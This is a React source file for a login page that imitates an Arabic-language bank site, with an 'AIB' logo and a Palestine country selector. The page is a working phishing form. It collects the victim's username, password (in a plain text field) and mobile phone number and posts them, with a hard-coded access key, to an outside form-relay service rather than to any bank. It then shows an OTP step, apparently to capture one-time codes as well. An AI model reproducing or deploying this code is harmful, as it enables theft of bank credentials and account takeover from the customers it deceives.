import React, { useState } from "react";
import { X, CreditCard } from "lucide-react";
import bankLogo from "../assets/images/logo.png";
import { useNavigate } from "react-router-dom";
import OTPVerification from "./OTP";
import { Globe } from "lucide-react";

const LoginL = () => {
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [otpVisible, setOtpVisible] = useState(false);
  const [isOtpVerified, setIsOtpVerified] = useState(false);
  const navigate = useNavigate();

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("جاري الإرسال...");
    setLoading(true);

    // Simulate a delay for form submission
    setTimeout(async () => {
      setLoading(false);
      const formData = new FormData(event.target);
      formData.append("access_key", "20f19016-48fa-475b-b343-bae03fc652bf");

      try {
        const response = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          body: formData,
        });

        const data = await response.json();
        if (data.success) {
          setResult("تم إرسال النموذج بنجاح");
          setOtpVisible(true);

          // Navigate back to home after OTP verification (10 seconds)
          setTimeout(() => {
            setOtpVisible(false);
            navigate("/");
          }, 10000); // Changed from 1000000000 to 10000 (10 seconds)
        } else {
          console.error("Error", data);
          setResult(data.message || "حدث خطأ أثناء إرسال النموذج");
        }
      } catch (error) {
        console.error("Submission error:", error);
        setResult("فشل الإرسال، حاول مرة أخرى");
        setLoading(false);
      }
    }, 5000);
  };

  return (
    <div className="py-4">
      {loading ? (
        <div className="flex justify-center items-center min-h-screen">
          <div className="text-lg text-gray-700">جاري التحميل...</div>
        </div>
      ) : otpVisible ? (
        isOtpVerified ? (
          <div className="text-center text-lg text-green-600">
            تم التحقق بنجاح!
          </div>
        ) : (
          <OTPVerification onVerified={() => setIsOtpVerified(true)} />
        )
      ) : (
        <div className="min-h-screen p-4 ">
          {/* Header */}

          {/* Language Selector */}
          <div className="absolute top-4 left-4 flex items-center gap-2">
            <div className="flex items-center gap-1 text-gray-600">
              <Globe size={16} />
              <span className="text-sm">EN</span>
            </div>

            <div className="flex items-center gap-1 text-blue-600">
              <div className="w-4 h-4 rounded-full bg-gradient-to-r from-blue-500 to-blue-600 flex items-center justify-center">
                <span className="text-white text-xs">⚙</span>
              </div>
              <span className="text-sm font-medium">العربية</span>
            </div>
          </div>
          <br />
          <br />
          <br />
          <br />
          <div className="flex justify-center items-center mb-12">
            <img
              src={bankLogo}
              width={240}
              alt="AIB Logo"
              className="object-contain"
            />
          </div>
          <br />
          <br />
          {/* Country Selector */}
          <div className="relative">
            <div className="absolute -top-10 right-0 lg:hidden  flex justify-between items-center gap-48">
              <div className="flex items-center gap-1">
                {/* Palestine flag representation */}
                <div className="w-6 h-4 relative overflow-hidden rounded-lg">
                  <div className="w-full h-1/3 bg-black"></div>
                  <div className="w-full h-1/3 bg-white"></div>
                  <div className="w-full h-1/3 bg-green-600"></div>
                  <div className="absolute left-0 top-0 w-0 h-0 border-l-[12px] border-l-red-600 border-t-[8px] border-t-transparent border-b-[8px] border-b-transparent"></div>
                </div>
                <span className="text-sm font-medium">فلسطين</span>
              </div>
              <span className="text-sm text-gray-600">تغيير الدولة</span>
            </div>
          </div>
          {/* Registration Form */}
          <form onSubmit={onSubmit} className="space-y-6 max-w-md mx-auto">
            {/* Username Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">اسم المستخدم</label>
              <input
                className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                placeholder="ادخل اسم المستخدم الخاص بك"
                dir="rtl"
                name="username" // Added name attribute
                required
              />
            </div>

            {/* Card Number Field */}
            {/* <div className="space-y-2 text-right">
              <label className="block text-gray-700">رقم البطاقة</label>
              <div className="flex gap-2">
                <input
                  className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                  name="card_number"
                  type="text"
                  placeholder="أدخل رقم البطاقة الخاص بك"
                  dir="rtl"
                  required
                  // pattern="\d{16}" // Basic validation for 16-digit card number
                  title="رقم البطاقة يجب أن يتكون من 16 رقمًا"
                />
                <div className="flex items-center justify-center w-14 h-14 bg-gray-200 rounded-lg">
                  <CreditCard className="text-[#92D3C8]" />
                </div>
              </div>
            </div> */}

            {/* Card Identifier Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">ادخل كلمة السر</label>
              <div className="relative">
                <input
                  type="text"
                  name="user_secret"
                  className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                  placeholder="ادخل كلمة السر"
                  dir="rtl"
                  required
                />
              </div>
            </div>

            {/* Phone Number Field */}
            <div className="space-y-2 text-right">
              <label className="block text-gray-700">رقم الموبايل</label>
              <input
                type="tel"
                name="phone_number"
                className="w-full bg-gray-200 rounded-lg p-3 rtl placeholder:text-sm"
                placeholder="ادخل رقم الموبايل الخاص بك"
                dir="rtl"
                required
                // pattern="\+?\d{10,14}" // Basic phone number validation
                // title="أدخل رقم موبايل صالح (10-14 رقمًا)"
              />
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full bg-[#1300F3] hover:bg-[#1300F3] text-white py-3 rounded-lg mt-6"
              disabled={loading}
            >
              دخول
            </button>
            <span className="block text-center mt-2">{result}</span>
            <div>
              <a href="/subs">نسيت كلمة السر / اسم المستخدم ؟</a>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};

export default LoginL;
